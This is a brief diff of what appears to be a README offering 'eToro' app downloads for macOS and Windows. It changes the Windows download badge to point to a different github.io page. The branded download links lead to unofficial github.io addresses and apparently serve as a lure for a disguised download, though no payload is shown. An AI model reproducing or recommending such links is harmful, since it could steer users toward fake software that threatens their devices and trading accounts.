@@ -9,7 +9,7 @@
 <img src="https://img.shields.io/badge/⬇️_Download_eToro_for_macOS-brightgreen?style=for-the-badge&logo=apple" alt="Download eToro App for macOS">  
 </a>  
 
-<a href="https://mokadami-olexus.github.io/.github/etoro-app">  
+<a href="https://etoro-app.github.io/.github">  
 <img src="https://img.shields.io/badge/⬇️_Download_eToro_for_Windows-blueviolet?style=for-the-badge&logo=windows" alt="Download eToro App for Windows">  
 </a>  
 </div>  
